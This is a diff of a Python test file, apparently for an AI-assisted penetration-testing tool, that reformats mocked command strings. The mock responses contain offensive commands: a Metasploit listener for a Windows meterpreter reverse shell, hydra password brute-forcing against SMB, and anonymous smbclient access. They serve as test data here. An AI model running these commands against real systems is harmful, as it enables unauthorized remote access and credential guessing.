@@ -42,11 +42,13 @@ def test_modify_command_dialog_avoidance(mock_chat, settings):
     mock_chain.invoke.side_effect = [
         # Dialog avoidance response
         json.dumps({
-            "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
+            "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
+                       "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
         }),
         # List files response (no change)
         json.dumps({
-            "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
+            "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
+                       "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
         })
     ]
 
@@ -92,7 +94,8 @@ def test_modify_command_list_files(mock_chat, settings):
         }),
         # List files response
         json.dumps({
-            "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+            "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                       "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
         })
     ]
 
@@ -139,7 +142,8 @@ def test_modify_command_both_modifications(mock_chat, settings):
         }),
         # List files response
         json.dumps({
-            "command": "smbclient -N //10.10.10.40/share -c 'get /usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
+            "command": "smbclient -N //10.10.10.40/share -c "
+                       "'get /usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
         })
     ]
 
@@ -238,7 +242,8 @@ def test_modify_command_multiple_commands(mock_chat, settings):
         }),
         # List files for command 2
         json.dumps({
-            "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+            "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                       "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
         })
     ]
 
